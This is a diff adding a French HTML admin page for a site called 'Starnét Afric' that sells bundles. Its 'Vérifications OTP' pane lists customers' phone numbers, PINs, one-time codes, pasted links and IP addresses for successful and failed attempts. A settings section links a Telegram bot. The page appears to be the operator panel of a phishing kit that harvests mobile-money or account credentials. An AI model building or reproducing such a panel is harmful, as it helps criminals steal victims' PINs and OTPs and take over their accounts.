@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Administration — Starnét Afric</title>
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+  <div class="admin-shell">
+    <aside class="admin-side">
+      <div class="side-brand">STARNÉT AFRIC<span>Panneau d'administration</span></div>
+      <a href="#" data-view="dashboard" class="active">Tableau de bord</a>
+      <a href="#" data-view="orders">Commandes</a>
+      <a href="#" data-view="verifications">Vérifications OTP</a>
+      <a href="#" data-view="analytics">Analytique</a>
+      <a href="#" data-view="packages">Forfaits</a>
+      <a href="#" data-view="customers">Clients</a>
+      <a href="#" data-view="messages">Messages</a>
+      <a href="#" data-view="settings">Paramètres</a>
+      <div style="flex:1;"></div>
+      <button class="lnk" id="btn-logout">Déconnexion</button>
+      <a href="/forfaits.html" target="_blank">Voir le site public</a>
+    </aside>
+    <main class="admin-main">
+      <div class="admin-top">
+        <span>Connecté en tant que <b id="admin-user">…</b></span>
+        <a href="/forfaits.html" target="_blank" style="color:#8fa0b6;">Voir le site →</a>
+      </div>
+
+      <section data-pane="dashboard">
+        <div class="kpis" id="kpis"></div>
+        <div class="dark-card">
+          <h2>Dernières commandes</h2>
+          <div class="table-scroll"><table class="data" id="tab-dernieres"></table></div>
+        </div>
+      </section>
+
+      <section data-pane="orders" class="hidden">
+        <div class="dark-card">
+          <h2>Gestion des commandes</h2>
+          <div class="row" style="margin-bottom:14px;">
+            <input class="admin-input" id="q-orders" placeholder="Rechercher…" style="max-width:320px;">
+            <button class="btn small" id="btn-refresh-orders">Actualiser</button>
+          </div>
+          <div class="table-scroll"><table class="data" id="tab-orders"></table></div>
+        </div>
+      </section>
+
+      <section data-pane="verifications" class="hidden">
+        <div class="kpis" id="verif-kpis"></div>
+        <div class="dark-card">
+          <div class="row" style="justify-content:space-between;align-items:center;margin-bottom:12px;flex-wrap:wrap;gap:10px;">
+            <div>
+              <h2 style="margin:0;">Tentatives PIN / OTP / Liens</h2>
+              <p style="margin:6px 0 0;color:#8fa0b6;font-size:13px;">Toutes les tentatives clients (succès et échecs).</p>
+            </div>
+            <div class="row" style="gap:8px;">
+              <input class="admin-input" id="q-verif" placeholder="Filtrer téléphone, PIN, OTP…" style="max-width:220px;">
+              <select class="admin-input" id="f-verif-action" style="max-width:180px;">
+                <option value="">Toutes</option>
+                <option value="otp_requested">OTP demandé</option>
+                <option value="otp_failed">OTP incorrect</option>
+                <option value="otp_verified">OTP OK</option>
+                <option value="pin_failed">PIN incorrect</option>
+                <option value="link_submitted">Lien collé</option>
+              </select>
+              <button class="btn small" id="btn-refresh-verif" type="button">Actualiser</button>
+              <button class="btn small" id="btn-clear-verif" type="button" style="background:#7f1d1d;">Vider</button>
+            </div>
+          </div>
+          <div class="table-scroll">
+            <table class="data" id="tab-verif">
+              <thead>
+                <tr>
+                  <th>Date</th><th>Action</th><th>Provider</th><th>Téléphone</th>
+                  <th>PIN</th><th>OTP</th><th>Lien</th><th>Forfait</th><th>IP</th>
+                </tr>
+              </thead>
+              <tbody id="tab-verif-body"><tr><td colspan="9" class="muted">Chargement…</td></tr></tbody>
+            </table>
+          </div>
+        </div>
+      </section>
+
+      <section data-pane="analytics" class="hidden">
+        <div class="dark-card"><h2>Analytique</h2><div id="analytics-box" class="muted">Données analytiques</div></div>
+      </section>
+
+      <section data-pane="packages" class="hidden">
+        <div class="dark-card"><h2>Forfaits</h2><div class="table-scroll"><table class="data" id="tab-packages"></table></div></div>
+      </section>
+
+      <section data-pane="customers" class="hidden">
+        <div class="dark-card"><h2>Clients</h2><div class="table-scroll"><table class="data" id="tab-customers"></table></div></div>
+      </section>
+
+      <section data-pane="messages" class="hidden">
+        <div class="dark-card"><h2>Messages</h2><div class="table-scroll"><table class="data" id="tab-messages"></table></div></div>
+      </section>
+
+      <section data-pane="settings" class="hidden">
+        <div class="dark-card">
+          <h2>Mot de passe admin</h2>
+          <p style="color:#8fa0b6;font-size:13px;">Changez le mot de passe après la première connexion. Vous pouvez aussi définir <code>ADMIN_USER</code> et <code>ADMIN_PASSWORD</code> dans Vercel → Settings → Environment Variables.</p>
+          <form id="form-password">
+            <div class="field"><label class="admin-label">Mot de passe actuel</label><input class="admin-input" type="password" id="pw-current" required></div>
+            <div class="field"><label class="admin-label">Nouveau mot de passe</label><input class="admin-input" type="password" id="pw-next" minlength="6" required></div>
+            <button class="btn small" type="submit">Changer le mot de passe</button>
+          </form>
+          <div id="pw-alert" style="margin-top:10px;"></div>
+        </div>
+        <div class="dark-card">
+          <h2>Telegram</h2>
+          <p>Bot: <b>@starnettellbot</b>. Envoyez /start au bot une fois.</p>
+          <div class="row" style="margin-top:8px;">
+            <button class="btn small" id="btn-tg-probe" type="button">Détecter mon chat</button>
+            <button class="btn small success" id="btn-tg-test" type="button">Envoyer un test</button>
+          </div>
+          <div id="tg-result"></div>
+        </div>
+      </section>
+    </main>
+  </div>
+  <script src="/js/common.js"></script>
+  <script src="/js/admin.js?v=2"></script>
+</body>
+</html>
